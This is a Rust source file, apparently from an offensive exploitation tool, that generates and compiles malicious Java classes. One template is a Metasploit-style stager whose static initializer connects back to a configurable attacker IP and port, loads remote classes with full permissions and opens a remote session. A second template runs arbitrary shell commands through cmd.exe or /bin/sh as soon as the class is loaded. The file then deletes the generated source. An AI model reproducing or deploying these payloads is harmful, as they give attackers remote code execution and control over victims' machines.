use std::process::Command;
use std::fs::File;
use std::error::Error;
use std::io::prelude::*;
use std::path::Path;

use crate::common::BuildCmdCfg;

pub fn does_program_exist(name : &str) -> bool{
    match Command::new(name).arg("--version").output() {
        Err(_) => {
            eprintln!("We could not find {}", name);
            return false;
        },
        Ok(j) => {
            let _s : String = String::from_utf8(j.stdout).unwrap();
            //println!("we found {} : {}", name, s);
            return true;
        }
    }
}

pub fn is_javac_installed() -> bool{
    does_program_exist("javac")
}

fn compile_java(java_file_path : &Path) -> bool {
    let java_file_name = java_file_path.to_str().expect("Bad build path");
    //println!("attempting to build {}", java_file_name);
    match Command::new("javac").arg(java_file_name).output() {
        Err(e) => {
            eprintln!("Unable to compile {} : {}", java_file_name, e);
            return false;
        },
        _ => return true,
    }
}

fn get_mm_code(class_name : &str, msf_ip : &str, msf_port : &str) -> String{
    let code = r###"import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Enumeration;
import java.util.StringTokenizer;

public class <CLASS_NAME> extends ClassLoader {
  public <CLASS_NAME>() {}
  static{
    Runnable r  = () ->{
      try{
        String lHost = "<MSF_IP>";
        int lPort = <MSF_PORT>;
        Socket socket = new Socket(lHost, lPort);
        InputStream in = socket.getInputStream();
        OutputStream out = socket.getOutputStream();
        new <CLASS_NAME>().bootstrap(in, out);
      }catch(Exception e){
        e.printStackTrace();
      }
    };
    Thread t = new Thread(r);
    t.start();
  }

  private final void bootstrap(InputStream rawIn, OutputStream out) throws Exception {
    try {
      final DataInputStream in = new DataInputStream(rawIn);
      Class clazz;
      final Permissions permissions = new Permissions();
      permissions.add(new AllPermission());
      final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
      int length = in.readInt();
      do {
        final byte[] classfile = new byte[length];
        in.readFully(classfile);
        resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
        length = in.readInt();
      } while (length > 0);
      final Object stage = clazz.newInstance();
      clazz.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, in, out, new String[]{""});
    } catch (final Throwable t) {
      t.printStackTrace(new PrintStream(out));
    }
  }
}"###;

    code.replace("<CLASS_NAME>", class_name).replace("<MSF_IP>", msf_ip).replace("<MSF_PORT>", msf_port)    
}

pub fn ensure_mm_class_exists(base_dir : &str, class_name : &str, msf_ip : &str, msf_port : &str) -> Result<(), Box<dyn Error>>{
    let java_file_path= Path::new(&base_dir).join(format!("{}.java", &class_name));
    if !java_file_path.exists() {
        return build_mm_class(base_dir, class_name, msf_ip, msf_port);
    }
    Ok(())
}

pub fn build_mm_class(base_dir : &str, class_name : &str, msf_ip : &str, msf_port : &str) -> Result<(), Box<dyn Error>>{
    let java_file_path= Path::new(&base_dir).join(format!("{}.java", &class_name));
    let mut file = File::create(&java_file_path)?;
    file.write(get_mm_code(class_name, msf_ip, msf_port).as_bytes())?;
    file.flush()?;
    compile_java(&java_file_path);
    std::fs::remove_file(java_file_path)?;
    
    Ok(())
}

fn get_exec_cmd_code(class_name : &str, l_cmd : &str, w_cmd : &str) -> String{
    let code =  r###"
    public class <CLASS_NAME> {
    public <CLASS_NAME>() {}
    static {
        try {
            String[] w_cmd = {"cmd.exe","/c", "<W_CMD>"};
            String[] l_cmd = {"/bin/sh","-c", "<L_CMD>"};
            if(System.getProperty("os.name").toLowerCase().contains("win")){
              if(w_cmd[2].length() > 0){
                java.lang.Runtime.getRuntime().exec(w_cmd).waitFor();
              }
            }else{
              if(l_cmd[2].length() > 0){
                java.lang.Runtime.getRuntime().exec(l_cmd).waitFor();
              }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        <CLASS_NAME> e = new <CLASS_NAME>();
    }
}"###;
    let code =code
    .replace("<CLASS_NAME>", class_name)
    .replace("<W_CMD>", w_cmd)
    .replace("<L_CMD>", l_cmd);
    code
}

fn format_cmd(cmd : &str) -> String{
    cmd.replace("\\", "\\\\").replace("\"", "\\\"")
}

pub fn build_exec_cmd_class(cfg : BuildCmdCfg) -> Result<(), Box<dyn Error>>{
//      let java_file_name = format!("{}/{}.java", cfg.build_path, cfg.class_name); //todo use path join
    let java_file_path= Path::new(&cfg.build_path).join(format!("{}.java", &cfg.class_name));
    let mut file = File::create(&java_file_path)?;
    file.write(get_exec_cmd_code(&cfg.class_name, &format_cmd(&cfg.l_cmd), &format_cmd(&cfg.w_cmd)).as_bytes())?;
    file.flush()?;
    compile_java(&java_file_path);
    std::fs::remove_file(java_file_path)?;
    
    Ok(())
}

